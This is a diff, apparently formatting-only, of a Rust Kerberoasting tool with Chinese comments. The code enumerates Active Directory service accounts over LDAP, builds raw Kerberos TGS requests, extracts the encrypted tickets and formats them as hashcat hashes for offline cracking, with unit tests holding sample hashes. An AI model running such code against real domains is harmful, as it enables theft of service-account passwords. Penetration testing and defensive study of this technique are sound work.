@@ -84,8 +84,7 @@ async fn query_spn_users(
     password: Option<&str>,
 ) -> Result<Vec<SpnTarget>, String> {
     let ldap_url = format!("ldap://{}:389", dc);
-    let mut ldap = ldap3::LdapConn::new(&ldap_url)
-        .map_err(|e| format!("LDAP连接失败: {}", e))?;
+    let mut ldap = ldap3::LdapConn::new(&ldap_url).map_err(|e| format!("LDAP连接失败: {}", e))?;
 
     // 绑定
     match (username, password) {
@@ -107,7 +106,10 @@ async fn query_spn_users(
     let base_dn = domain_to_dn(domain);
     let filter = "(&(servicePrincipalName=*)(objectClass=user)(!(objectClass=computer)))";
     let attrs = &[
-        "sAMAccountName", "servicePrincipalName", "adminCount", "description",
+        "sAMAccountName",
+        "servicePrincipalName",
+        "adminCount",
+        "description",
     ];
 
     let sr = ldap
@@ -228,9 +230,7 @@ fn build_tgs_req(domain: &str, spn: &str) -> Vec<u8> {
 
     // kdc-options [0] BIT STRING
     // FORWARDABLE | RENEWABLE | CANONICALIZE = 0x50800000
-    req_body.extend_from_slice(&[
-        0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00,
-    ]);
+    req_body.extend_from_slice(&[0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00]);
 
     // realm [1] GeneralString
     let realm_len = domain_bytes.len() as u8;
@@ -271,9 +271,8 @@ fn build_tgs_req(domain: &str, spn: &str) -> Vec<u8> {
 
     // till [4] GeneralizedTime (20370913024805Z)
     req_body.extend_from_slice(&[
-        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37,
-        0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34, 0x38,
-        0x30, 0x35, 0x5A,
+        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37, 0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34,
+        0x38, 0x30, 0x35, 0x5A,
     ]);
 
     // nonce [5] INTEGER
@@ -281,9 +280,7 @@ fn build_tgs_req(domain: &str, spn: &str) -> Vec<u8> {
 
     // etype [8] SEQUENCE OF INTEGER (RC4-HMAC=23, AES256=18, AES128=17)
     req_body.extend_from_slice(&[
-        0xA8, 0x0C,
-        0x30, 0x0A,
-        0x02, 0x01, 0x17, // 23
+        0xA8, 0x0C, 0x30, 0x0A, 0x02, 0x01, 0x17, // 23
         0x02, 0x01, 0x12, // 18
         0x02, 0x01, 0x11, // 17
     ]);
@@ -346,7 +343,10 @@ fn parse_tgs_rep(
     // 策略：查找Ticket [APPLICATION 1] (0x61)，然后在其内部找enc-part [3]
     // 回退：遍历所有0xA3位置，找包含EncryptedData（etype+cipher）的那个
     // 找到Ticket则从Ticket内部开始搜索，否则从头遍历
-    let search_start = data.windows(2).position(|w| w[0] == 0x61).unwrap_or_default();
+    let search_start = data
+        .windows(2)
+        .position(|w| w[0] == 0x61)
+        .unwrap_or_default();
 
     // 遍历所有0xA3位置，找到包含有效EncryptedData的
     let mut offset = search_start;
@@ -361,7 +361,9 @@ fn parse_tgs_rep(
                 if etype_pos + 3 < inner.len() {
                     let len_byte = inner[etype_pos + 3] as usize;
                     if etype_pos + 4 + len_byte <= inner.len() {
-                        found_etype = Some(bytes_to_i32(&inner[etype_pos + 4..etype_pos + 4 + len_byte]));
+                        found_etype = Some(bytes_to_i32(
+                            &inner[etype_pos + 4..etype_pos + 4 + len_byte],
+                        ));
                     }
                 }
             }
@@ -374,7 +376,8 @@ fn parse_tgs_rep(
                     let os_len = after_tag[os_pos + 1] as usize;
                     let cipher_start = os_pos + 2;
                     if cipher_start + os_len <= after_tag.len() {
-                        found_cipher = Some(after_tag[cipher_start..cipher_start + os_len].to_vec());
+                        found_cipher =
+                            Some(after_tag[cipher_start..cipher_start + os_len].to_vec());
                     }
                 }
             }
@@ -419,7 +422,7 @@ fn format_krb5tgs_hashcat(
     cipher: &[u8],
 ) -> String {
     let checksum_len = match etype {
-        23 => 16, // RC4-HMAC: 16字节checksum
+        23 => 16,      // RC4-HMAC: 16字节checksum
         17 | 18 => 12, // AES: 12字节checksum
         _ => 16,
     };
@@ -501,7 +504,11 @@ fn bytes_to_i32(bytes: &[u8]) -> i32 {
 
 /// 获取LDAP属性
 fn get_attr(entry: &ldap3::SearchEntry, name: &str) -> Option<String> {
-    entry.attrs.get(name).and_then(|v| v.first().cloned()).filter(|v| !v.is_empty())
+    entry
+        .attrs
+        .get(name)
+        .and_then(|v| v.first().cloned())
+        .filter(|v| !v.is_empty())
 }
 
 /// 获取多个LDAP属性
@@ -511,7 +518,11 @@ fn get_attr_multi(entry: &ldap3::SearchEntry, name: &str) -> Vec<String> {
 
 /// 域名转DN格式
 fn domain_to_dn(domain: &str) -> String {
-    domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
+    domain
+        .split('.')
+        .map(|p| format!("DC={}", p))
+        .collect::<Vec<_>>()
+        .join(",")
 }
 
 #[cfg(test)]
@@ -555,9 +566,8 @@ mod tests {
             0x30, 0x1C, // SEQUENCE
             0xA0, 0x03, 0x02, 0x01, 0x17, // etype [0] = 23 (RC4-HMAC)
             0xA2, 0x15, 0x04, 0x13, // cipher [2] OCTET STRING (19 bytes)
-            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
-            0x10, 0x11, 0x12,
+            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D,
+            0x0E, 0x0F, 0x10, 0x11, 0x12,
         ];
         let (etype, cipher, hashcat) = parse_tgs_rep(&data, "CORP", "user", "HTTP/web").unwrap();
         assert_eq!(etype, 23);
@@ -632,7 +642,9 @@ mod tests {
             etype: 23,
             encrypted_ticket: vec![0xDE, 0xAD, 0xBE, 0xEF],
             domain: "corp.local".to_string(),
-            hashcat_hash: "$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sql01.corp.local:1433*$dead$beef".to_string(),
+            hashcat_hash:
+                "$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sql01.corp.local:1433*$dead$beef"
+                    .to_string(),
             admin_count: false,
             description: Some("SQL服务账户".to_string()),
         };
